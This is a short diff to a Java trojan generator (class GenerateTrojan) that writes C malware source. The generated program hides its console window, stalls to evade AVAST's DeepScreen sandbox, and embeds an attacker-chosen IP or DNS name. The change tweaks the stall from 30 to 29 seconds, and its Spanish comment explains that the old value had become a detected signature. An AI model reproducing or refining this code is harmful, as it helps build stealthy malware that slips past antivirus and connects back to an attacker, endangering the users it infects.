@@ -27,7 +27,7 @@ public class GenerateTrojan {
             writer.println("}");
             writer.println("main() {");     // Función Main
             writer.println("	ShowWindow( GetConsoleWindow(), SW_HIDE );");     // Ocultamos la ventana
-            writer.println("	int retTime = time(0) + 30;");    // Esperamos 20 segundos para evitarnos el DeepScreen de AVAST y similares...
+            writer.println("	int retTime = time(0) + 29;");    // Esperamos 29 segundos (antes eran 30, pero se convirtió en un patrón detectado) para evitarnos el DeepScreen de AVAST y similares...
             writer.println("	while(time(0)<retTime);");        // Mientras no haya acabado el tiempo, no hace nada.
             
             writer.println("      char* IP = \""+IP+"\";");   // Creamos una cadena de carácteres con la IP/DNS elegida en el perfil
